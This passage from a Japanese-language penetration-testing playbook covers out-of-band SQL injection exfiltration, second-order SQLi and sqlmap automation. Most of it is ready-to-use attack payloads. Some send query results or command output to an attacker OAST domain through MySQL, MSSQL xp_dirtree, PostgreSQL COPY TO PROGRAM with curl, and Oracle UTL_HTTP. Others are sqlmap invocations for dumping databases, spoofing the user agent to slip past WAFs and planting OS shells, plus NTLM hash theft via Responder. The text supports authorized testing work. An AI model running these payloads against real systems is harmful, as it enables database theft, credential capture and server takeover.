レスポンス完全に同じで boolean / time-based も成立しない場合の最終手段。DB から外部 DNS / HTTP に向けて exfil する。

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須:
> - [ ] 業務停止リスク
> - [ ] 持続化に該当
> - [ ] 不可逆な設定変更を含む
> - [x] SIEM / EDR で確実に検知される（DB プロセスの異常な外部接続・DNS query log・proxy log）
> - [x] 外部 OAST サーバへデータが流出する（情報漏洩リスク・3rd party Burp Collaborator instance への送信）
>
> 実施可否は事前合意で明示確認すること。**自社管理の OAST サーバ**（Interactsh self-hosted）の利用を推奨。演習環境（HTB / OSCP 等）では制約なし。

**コマンド:**

```bash
# [Attacker] OAST サーバの準備
# (1) Burp Collaborator: Burp Pro 同梱・「Burp Collaborator client」から domain 取得
# (2) Interactsh client（OSS・無償）
interactsh-client                            # listen 開始
# → [INF] xxx.oast.fun  といった subdomain が払い出される。以後 DNS / HTTP / SMTP 着信が表示される
```

```sql
-- [Attacker] MySQL Windows 限定: UNC パス経由 SMB → DNS 解決でデータ exfil
?id=1' AND LOAD_FILE(CONCAT('\\\\', (SELECT @@version), '.', '[OAST_DOMAIN]', '\\x')) -- -
-- → 攻撃者 OAST DNS に `[VERSION_STRING].[OAST_DOMAIN]` の query 着信

-- [Attacker] MSSQL: xp_dirtree（NTLM ハッシュ steal も同時発生）
?id=1; EXEC master..xp_dirtree '\\\\[OAST_DOMAIN]\\x' --
-- → 攻撃者 OAST に DNS + SMB 接続着信。SMB を Responder で listen していると NTLMv2 ハッシュも取れる

-- [Attacker] MSSQL: 値を埋め込んだ exfil
?id=1; DECLARE @x VARCHAR(1024); SET @x = '\\\\' + (SELECT TOP 1 username FROM users) + '.[OAST_DOMAIN]\\x'; EXEC master..xp_dirtree @x --

-- [Attacker] PostgreSQL: COPY ... TO PROGRAM 経由（SUPERUSER 必要 → ../PostgreSQL_Exploitation.md §8）
?id=1; COPY (SELECT '') TO PROGRAM 'curl http://[OAST_DOMAIN]/?d=$(whoami)' --

-- [Attacker] PostgreSQL: dblink 拡張で TCP 接続（dblink 拡張インストール必要）
?id=1' UNION SELECT dblink_connect('host=[OAST_DOMAIN] user=anything password=anything dbname=anything') -- -

-- [Attacker] Oracle: UTL_HTTP.REQUEST で HTTP exfil
?id=1' UNION SELECT UTL_HTTP.REQUEST('http://[OAST_DOMAIN]/?d=' \|\| (SELECT user FROM dual)) FROM dual -- -

-- [Attacker] Oracle: DBMS_LDAP で LDAP 経由
?id=1' UNION SELECT DBMS_LDAP.INIT('[OAST_DOMAIN]', 80) FROM dual -- -
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| OAST サーバに DNS query / HTTP request が着信 | OAST 経路成立・blind 状態でも exfil 可能 | subdomain 部分に subquery 結果を埋め込んで反復抽出 |
| 着信なし（一切来ない） | 外部接続が FW で遮断 / DB 関数が無効化 | 別 DB 関数 / 経路を試す・boolean / time-based に戻る |
| DNS query は来るが内容が truncated | DNS label 長制限（63 文字）/ ホスト名長制限（253 文字） | subquery を `SUBSTRING` で分割して複数 query で送信 |
| MSSQL `xp_dirtree` で OAST 着信 + Responder で NTLMv2 ハッシュ取得 | MSSQL サービスアカウントの NTLM ハッシュ取得 | `../MSSQL_Exploitation.md` / `../../05_Tools_Reference/Hashcat.md`（mode 5600）でクラック |
| Burp Collaborator の DNS log に内部 IP（FW 越え遮断） | DB サーバから直接 DNS 外部解決可能（よくある誤設定）| OAST 経路で多量データ exfil 可能（事前合意確認） |

> **注意:** OAST は **boolean / time-based が完全に空振りした場合の最終手段**。`xp_dirtree` は **NTLMv2 ハッシュ steal** が副作用として発生するため、MSSQL の場合は OAST と同時に NTLM Relay 攻撃の射程に入る（`../../04_Post_Access_Windows_AD/NTLM_Relay/Responder.md`）。**外部 OAST サーバへの送信は 3rd party へのデータ流出**なので、本番ではセルフホスト Interactsh または対象組織管理 DNS を使う。FW / NDR は **DB サーバからのアウトバウンド DNS / HTTP を異常として検知**するため、SIEM 検知前提で実施する。

---

## 10. Second-order SQLi

**着火条件:** 入力が**保存時には escape されている**が、後続の別クエリで再度 SQL 文字列に組み込まれる際にエスケープが解除される / 別の経路で混入する。

**典型シナリオ:**

```sql
-- [Attacker] パターン A: ユーザー名にペイロードを仕込んで登録 → パスワード変更時に発火
-- 登録時クエリ（escape あり）:
INSERT INTO users (username, password) VALUES ('admin'' --', 'mypass')
-- → 'admin\' --' として保存される（DB 内では admin' -- というユーザー名）

-- ログイン後にパスワード変更フォームを叩く
-- 変更時クエリ（保存値を unescaped で直接埋め込み）:
UPDATE users SET password = 'newpass' WHERE username = 'admin' -- '
-- → admin ユーザーのパスワードが newpass に書き換わる（本物 admin の権限奪取）
```

```sql
-- [Attacker] パターン B: プロフィール表示時に WHERE 句に混入
-- 登録時: nickname に「' UNION SELECT password FROM users WHERE id=1 -- 」を保存（escape あり）
-- → DB 内には「' UNION SELECT password FROM users WHERE id=1 -- 」が保存される

-- プロフィール表示時:
SELECT bio FROM profiles WHERE nickname = '' UNION SELECT password FROM users WHERE id=1 -- '
-- → bio 欄に他ユーザーのパスワードが表示される
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| 登録は成功（保存値が DB に入っている） | 入力 escape は機能している | 保存値が後続クエリに直接埋め込まれるエンドポイントを探索（パスワード変更 / プロフィール表示 / 検索 / 通知）|
| 保存後の別エンドポイントで `UNION SELECT` の結果が表示される | Second-order 成立 | 既存ユーザーパスワード / cred 抽出 |
| 登録時に `'` が `\'` に escape されて保存 + 後続も同じ escape | 一貫した escape | second-order 経路無し |
| ユーザー名が unique 制約で `admin' --` の重複と判定される | 入力 vs 保存値の比較で escape 差分シグナル | escape 不整合の確証（second-order 候補） |

> **注意:** Second-order は **検出が難しい**（保存と発火の場所が異なる・通常テストの 1 機能スキャンでは見つからない）。手動で「ペイロードを仕込める入力フィールド」を全部試して保存 → アプリ全機能を試行する必要がある。Web アプリの主要機能（プロフィール / 設定 / 検索 / 通知 / 履歴 / メール送信）を順に叩いて、保存値がどこに出現するかを観察する。`sqlmap --second-order=URL` オプションで second-order 検出を半自動化できる。

---

## 11. sqlmap 自動化

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須:
> - [x] 業務停止リスク（`--level` / `--risk` を上げると重い payload や WAF 試験で大量リクエスト・DB 負荷）
> - [ ] 持続化に該当（`--os-shell` / `--os-pwn` で永続バックドア設置のオプションあり・標準では発生しない）
> - [ ] 不可逆な設定変更を含む（同上）
> - [x] SIEM / EDR で確実に検知される（sqlmap の User-Agent 既定値・大量 payload バリエーション・WAF アラート）
>
> 実施可否は事前合意で明示確認すること。演習環境（HTB / OSCP 等）では制約なし。

**コマンド:**

```bash
# [Attacker] GET パラメータへの基本検査
sqlmap -u "http://[TARGET]/page?id=1" --batch

# [Attacker] POST フォーム
sqlmap -u "http://[TARGET]/login" \
  --data="username=admin&password=test" \
  --batch

# [Attacker] 特定フィールドだけ検査
sqlmap -u "http://[TARGET]/login" --data="username=admin&password=test" -p username --batch

# [Attacker] DB 別検査の絞込（既に DB 種別が分かっている場合）
sqlmap -u "[URL]" --dbms=mysql --batch
sqlmap -u "[URL]" --dbms=mssql --batch
sqlmap -u "[URL]" --dbms=postgresql --batch

# [Attacker] technique を絞る（B=Boolean / E=Error / U=UNION / S=Stacked / T=Time / Q=Inline）
sqlmap -u "[URL]" --technique=BEU --batch              # blind + error + union のみ
sqlmap -u "[URL]" --technique=T --time-sec=5 --batch  # time-based のみ・遅延 5 秒

# [Attacker] WAF バイパス
sqlmap -u "[URL]" --tamper=space2comment,charencode --batch

# [Attacker] level / risk 調整（より深い検査・誤検知増・負荷増）
sqlmap -u "[URL]" --level=5 --risk=3 --batch

# [Attacker] Cookie 認証
sqlmap -u "http://[TARGET]/page" --cookie="session=[COOKIE_VALUE]" --batch

# [Attacker] DB 構造抽出
sqlmap -u "[URL]" --dbs --batch                                    # DB 一覧
sqlmap -u "[URL]" -D [DB_NAME] --tables --batch                    # テーブル一覧
sqlmap -u "[URL]" -D [DB_NAME] -T [TABLE_NAME] --dump --batch      # データ抽出

# [Attacker] Burp の Request を直接渡す（複雑なヘッダー・JSON body 対応）
sqlmap -r request.txt --batch

# [Attacker] 出力保存（再実行不要）
sqlmap -u "[URL]" --output-dir=./sqlmap_out --batch

# [Attacker] OS シェル取得（stacked queries 通る場合のみ）
sqlmap -u "[URL]" --os-shell --batch
# → 内部的に xp_cmdshell / COPY FROM PROGRAM / INTO OUTFILE webshell を試行
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `the back-end DBMS is [DB]` + payload 一覧 | 検出成立 | `--dbs` → `--tables` → `--dump` で抽出 |
| 全 payload が `not appear to be injectable` | レベル不足 / WAF / 注入箇所違い | `--level=5 --risk=3` / `--tamper` 追加・手動検出に切替 |
| `--os-shell` 成功 | stacked queries + DB SUPERUSER 権限 | エンジン固有 `*_Exploitation.md` で RCE 詳細・原状回復確認 |
| `--os-shell` 失敗 + `--technique=S` も空振り | stacked queries が通らない | UNION 抽出 + DB ファイル側の SUPERUSER 経路へ |
| WAF が sqlmap User-Agent をブロック | sqlmap の signature 検知 | `--user-agent=` / `--random-agent` で偽装 |
| 抽出途中で接続切断・IP BAN | レート制限 / DoS 保護 | `--delay=2` / `--threads=1` |

> **注意:** sqlmap の **デフォルトはレベル 1・リスク 1**。検出できない場合は `--level=5 --risk=3` を試すが、1 パラメータあたりの payload 数が桁違いに増える（公開ベンチで概ね 72 → 7,865、**約 109 倍**程度）ため WAF 検知・サーバー過負荷リスクが高まる。`--batch` を使うと全質問にデフォルト回答するので自動化しやすいが、重要な選択（payload リスクの上昇・OS shell の試行）を見逃すこともある。`--output-dir=./sqlmap_out` で保存しておけば再実行不要。`--os-shell` / `--os-pwn` は stacked queries + DB SUPERUSER 前提で、成功するとサーバ側に **webshell や UDF を設置する**ため、**原状回復: UDF 削除 / webshell 削除を必ず実施**（詳細は該当 DB ファイル §UDF / §FILE 章）。

---

## 刺さらなかったとき（全体）

| 状況 | 推定原因 | 代替手段 |
|---|---|---|
| `'` 投入で何も起きない | prepared statement / ORM で escape 済 | 別パラメータを試す・JSON / XML body へ深く入る・second-order |
| sqlmap で `not appear to be injectable` | level 不足 / WAF / 注入箇所が parameter ではなく path / header | `--level=5 --risk=3 --tamper=...` / 手動検出に切替 |
| UNION が `column count mismatch` で通らない | カラム数 / 型不一致 | §5(1) ORDER BY 経由で再特定 / 型一致 NULL placeholder で再構築 |
| Boolean blind の差分応答が安定しない | session noise / load balancer | 同一 cookie 維持・差分が安定するまで反復 |
| Time-based の SLEEP が刺さらない | DB 関数制限 / WAF で `SLEEP` block | DB 別の代替（BENCHMARK / heavy query / nested subquery） |
| OAST に着信無し | FW で外向き block / DB 関数禁止 | 別 DB 関数（dblink / UTL_HTTP / xp_dirtree）/ FW 内部の DNS resolver 経由 |
| 認証バイパスは通るが session が動かない | 認証と authz が分離・session の role 確認が別 SQL | role / is_admin カラムの取得経路を別途確保（UNION / second-order） |
| WAF で `'` が全て 403 | signature ベース WAF | `%2527` 二重 URL encode / `0x27` / `CHAR(39)` / Unicode `%u0027` / SQL 等価式（`LIKE` / `IN (...)`） |
| stacked queries が通らない | MySQL / Oracle のデフォルト・PHP `mysqli_query` 等 | UNION 抽出に絞る・stacked 必要な RCE 経路は諦め他経路 |
| エンジン固有 RCE まで進めない | DB の権限・version 制限 | 取得済の cred で DB ファイル側の §認証スプレー → 直接接続経路に転換 |

## 注意点・落とし穴

> **[HIGH IMPACT]** §9 OAST は外部 OAST サーバへのデータ流出を伴うため、本番では **セルフホスト Interactsh** または対象組織管理の DNS server を使う。3rd party Burp Collaborator instance は手軽だが情報漏洩リスクあり。

> **[HIGH IMPACT]** §11 sqlmap の `--level=5 --risk=3` / `--tamper` 多用 / `--os-shell` は DB 負荷・WAF アラート・サーバー側痕跡を確実に生む。事前合意の有無を確認すること。

> **[HIGH IMPACT]** §4 UPDATE SET 経由の認可昇格・パスワード上書きは **業務影響直撃**（既存 admin のパスワードを壊してしまう）。成功した時点で原状回復が困難になるため、本番では「**実証は read-only 経路で完了させる**」（UPDATE は試さず UNION 抽出で代替）。

> **個別のブロック固有の注意は各 §N ブロック内の「注意:」を参照。** 本セクションは複数ブロック横断の高影響警告のみを置く。

### 本番での前提

- **事前合意の要否**: ★★★（書面承認必須 — §4 UPDATE / INSERT 系の書込テスト / §9 OAST / §11 sqlmap `--os-shell`）/ ★★（口頭確認可 — §5 UNION での全 table dump 等の取得情報スコープ） / ★（§1 検出・§3 認証バイパスは 1〜2 試行までは技術的判断のみで実施可だが、対象組織との合意範囲は確認）
- **想定される SIEM / EDR 検知**: WAF（ModSecurity / Akamai / Cloudflare / AWS WAF）の SQLi シグナル・DB の slow query log / general log・Audit Plugin（pgAudit / MySQL Enterprise Audit / SQL Server Audit）・OAST 経由のアウトバウンド DNS / HTTP は NDR / proxy で確実に検知
- **業務影響リスク**: §4 UPDATE / §11 `--level=5` は DB 負荷・WAF アラート・既存データ破損リスク・§3 認証バイパスは認証ログを汚す・§7 Boolean / §8 Time-based の大量リクエストは DoS 判定で IP BAN
- **原状回復必須項目**: ✅ §4 UPDATE で書き込んだ場合はバックアップから原状復帰（**本番では UPDATE 経路は使わない**のが前提） / ✅ §11 sqlmap `--os-shell` で設置された webshell / UDF / pg_proc 関数の削除（該当 DB ファイル §RCE 章で詳述） / ✅ §9 OAST で外部送信したデータの破棄
- **取得情報の取扱**: 抽出したパスワードハッシュ・PII・ビジネスデータは暗号化保管、テスト完了時破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

> **エンジン固有の RCE / ファイル I/O / ハッシュ取得は本ファイルの範囲外** → DB を判別したら以下へ転送:
>
> - MSSQL: `../MSSQL_Exploitation.md`（`xp_cmdshell` 有効化・Linked Server 悪用・`xp_dirtree` NTLM steal）
> - MySQL: `../MySQL_Exploitation.md`（FILE 権限 `LOAD_FILE` / `INTO OUTFILE`・UDF RCE・`authorized_keys` 書込）
> - PostgreSQL: `../PostgreSQL_Exploitation.md`（`COPY FROM PROGRAM` 経由 OS コマンド実行（SUPERUSER 権限濫用、CVE-2019-9193 として一時報告されたが PostgreSQL community が「仕様通りの権限機能」として disputed/rejected 扱い）・PL/PerlU UDF・`lo_export` 経由 file write・`pg_read_file()` / `pg_ls_dir()` でのファイル I/O・`authorized_keys` 書込）

## 関連技術

- 前：ログインフォーム / URL パラメータの発見 → `../../01_Reconnaissance/Web_Enumeration.md`
- 前：レスポンス triage で SQL 由来エラーシグナル取得 → `../../01_Reconnaissance/Web_Response_Triage.md`
- 関連：アプリ × バージョン固有のペイロード（CMS Made Simple CVE-2019-9053 等） → `../../05_Tools_Reference/CVE_Notes.md`
- 後：認証情報が取得できた → `../Credential_Discovery.md`
- 後：MD5+Salt ハッシュのクラック → `../../05_Tools_Reference/Hashcat.md`（mode 20）
- 後：MSSQL バックエンド検出・stacked queries OK → `xp_cmdshell` / Linked Server / NTLM steal → `../MSSQL_Exploitation.md`
- 後：MySQL バックエンド検出 → FILE 権限・UDF RCE・`INTO OUTFILE` 経由 webshell / authorized_keys → `../MySQL_Exploitation.md`
- 後：PostgreSQL バックエンド検出 + SUPERUSER → `COPY FROM PROGRAM` / PL/PerlU UDF / `lo_export` → `../PostgreSQL_Exploitation.md`
- 後（管理者パネル到達後）：Web アプリ固有機能の調査・コマンドインジェクション等 → `./Command_Injection.md`
- 後（NTLM ハッシュ取得後）：NTLM Relay / Pass-the-Hash → `../../04_Post_Access_Windows_AD/NTLM_Relay/Responder.md`
- 関連：XSS（同じ入力フィールドの脆弱性） → `./XSS.md`
- 関連：OAST 経路は SSRF / Blind XXE と同じ exfil パターン → `./SSRF.md`（存在する場合）/ `./XXE.md`（存在する場合）
